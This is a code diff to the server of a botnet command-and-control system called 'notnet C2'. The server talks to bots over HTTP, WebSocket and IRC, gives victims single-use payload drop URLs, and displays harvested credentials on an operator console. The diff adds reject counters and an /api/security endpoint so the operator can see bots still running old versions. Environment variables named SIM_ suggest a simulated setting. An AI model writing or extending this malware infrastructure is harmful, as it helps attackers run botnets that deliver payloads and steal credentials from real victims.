@@ -389,6 +389,8 @@ def _ingest_upload(c2, body, ip, path, secret_ok=False):
     crafted URL can never escape uploads/ or smuggle odd filenames."""
     if not secret_ok:
         c2.state.add_event("auth_fail", f"upload without secret from {ip}")
+        c2.auth_fail_count += 1  # #195: silently dropped uploads are a
+        # version-skew symptom too — count them where the operator looks.
         log(f"UPLOAD REJECT {ip} (no secret)")
         return None
     if not body:
@@ -533,6 +535,7 @@ def handle_http(conn, addr, c2):
                 if kind == "heartbeat" and secret != c2.secret:
                     c2.state.add_event("auth_fail",
                                        f"bad secret from {ip} host={j.get('hostname','')}")
+                    c2.auth_fail_count += 1  # #195
                     log(f"AUTH-FAIL {ip} host={j.get('hostname','')}")
                     http_send(conn, json.dumps({"status": "ok", "secret": c2.secret}))
                     continue
@@ -542,6 +545,7 @@ def handle_http(conn, addr, c2):
                 if kind != "heartbeat" and not _request_secret_ok(c2, headers, j):
                     c2.state.add_event("auth_fail",
                                        f"response without secret from {ip}")
+                    c2.resp_reject_count += 1  # #195
                     log(f"RESP-REJECT {ip} (no secret)")
                     http_send(conn, json.dumps({"status": "ok", "secret": c2.secret}))
                     continue
@@ -577,10 +581,6 @@ def handle_http(conn, addr, c2):
             # shared secret (?secret= on the URL, matching the bot's
             # http_get_url which appends it). Unauthenticated GETs get the
             # generic ok-ack so scanners learn nothing.
-            # #173: payload + source-tarball downloads now require the
-            # shared secret (?secret= on the URL, matching the bot's
-            # http_get_url which appends it). Unauthenticated GETs get the
-            # generic ok-ack so scanners learn nothing.
             # #190: a single-use short-TTL download token (?token=) is also
             # accepted — that is what drop URLs carry now, so the fleet
             # secret never reaches the victim. The token is consumed on
@@ -595,6 +595,7 @@ def handle_http(conn, addr, c2):
                 token_ok = (False if path == "/bot/token"
                             else _dl_token_consume(c2, _query_param(raw_path, "token")))
                 if not (secret_ok or token_ok):
+                    c2.payload_reject_count += 1  # #195
                     log(f"PAYLOAD REJECT {ip} (no secret/token)")
                     http_send(conn, json.dumps({"status": "ok", "secret": c2.secret}))
                     continue
@@ -772,6 +773,7 @@ def handle_ws(conn, addr, c2):
                 if j.get("secret") != c2.secret:
                     c2.state.add_event("auth_fail",
                                        f"bad ws secret from {ip} host={j.get('hostname','')}")
+                    c2.auth_fail_count += 1  # #195
                     log(f"AUTH-FAIL {ip} host={j.get('hostname','')}")
                     ws_send_text(conn, json.dumps({"status": "ok", "secret": c2.secret}))
                     continue
@@ -790,6 +792,7 @@ def handle_ws(conn, addr, c2):
             elif j and not _request_secret_ok(c2, {}, j):
                 # #167: non-heartbeat WS frames (bot responses) used to be
                 # logged/ev'd with zero auth — same injection gap as HTTP.
+                c2.resp_reject_count += 1  # #195
                 log(f"WS RESP-REJECT {ip} (no secret)")
             ws_send_text(conn, json.dumps({"status": "ok", "secret": c2.secret}))
     except (socket.timeout, ConnectionError, OSError):
@@ -925,6 +928,7 @@ def handle_irc(conn, addr, c2, nick, channel):
                                 if hb.get("secret") != c2.secret:
                                     c2.state.add_event("auth_fail",
                                                        f"bad irc secret from {ip}")
+                                    c2.auth_fail_count += 1  # #195
                                     log(f"AUTH-FAIL {ip}")
                                     continue
                                 c2.state.upsert_bot(hb, ip, "irc")
@@ -1035,6 +1039,16 @@ class ConsoleHandler(BaseHTTPRequestHandler):
                 b["ago"] = max(0, int(time.time() - (b["last_seen"] or 0)))
             self._send(json.dumps({"bots": bots}), "application/json")
             return
+        if path == "/api/security":
+            # #195: version-skew observability — a fleet of pre-#173 bots
+            # shows up here as climbing reject counters instead of silence.
+            self._send(json.dumps({
+                "auth_fails": c2.auth_fail_count,
+                "resp_rejects": c2.resp_reject_count,
+                "payload_rejects": c2.payload_reject_count,
+                "since_start": int(time.time() - c2.started_at),
+            }), "application/json")
+            return
         if path == "/api/creds":
             self._send(json.dumps({"creds": c2.state.creds()}),
                        "application/json")
@@ -1097,6 +1111,7 @@ def console_html():
  .ok{color:#5f5}
 </style></head><body>
 <h1>notnet C2 — operator console</h1>
+<p id="secstats" style="color:#f90">security: loading…</p>
 <h2>Bots</h2>
 <table id="bots"><thead><tr><th>hostname</th><th>tag</th><th>ip</th>
 <th>version</th><th>uptime</th><th>scan</th><th>creds</th><th>proxy</th>
@@ -1138,6 +1153,14 @@ async function refresh(){
  tg.innerHTML='';for(const x of cr.creds){const tr=document.createElement('tr');
  tr.innerHTML=`<td>${x[0]}</td><td>${esc(x[1])}</td><td>${esc(x[2]||'')}</td><td>${Math.round(x[3])}</td>`;
  tg.appendChild(tr);}
+ // #195: version-skew counters — climbing rejects mean a pre-#173 bot
+ // fleet is being silently dropped; keep this last so an /api/security
+ // hiccup can never blank the tables above.
+ try{
+  const s=await j('/api/security');
+  document.querySelector('#secstats').textContent=
+   `security: auth_fails=${s.auth_fails} resp_rejects=${s.resp_rejects} payload_rejects=${s.payload_rejects} (uptime ${Math.round(s.since_start)}s)`;
+ }catch(e){}
 }
 document.querySelector('#qform').addEventListener('submit',async e=>{
  e.preventDefault();
@@ -1212,6 +1235,13 @@ class C2:
         #                  would otherwise steal commands, the #119 race)
         self.evidence = os.environ.get("SIM_EVIDENCE", "")
         self.bot_ip = os.environ.get("SIM_BOT_IP", "")
+        # #195: version-skew observability. Pre-#173 bots against the new
+        # C2 degrade silently (payload ack-as-binary, dropped responses);
+        # these counters make that fleet visible on the console instead.
+        self.auth_fail_count = 0
+        self.resp_reject_count = 0
+        self.payload_reject_count = 0
+        self.started_at = time.time()
         self.tls_ctx = None
         cert = os.environ.get("NOTNET_C2_TLS_CERT", "")
         key = os.environ.get("NOTNET_C2_TLS_KEY", "")
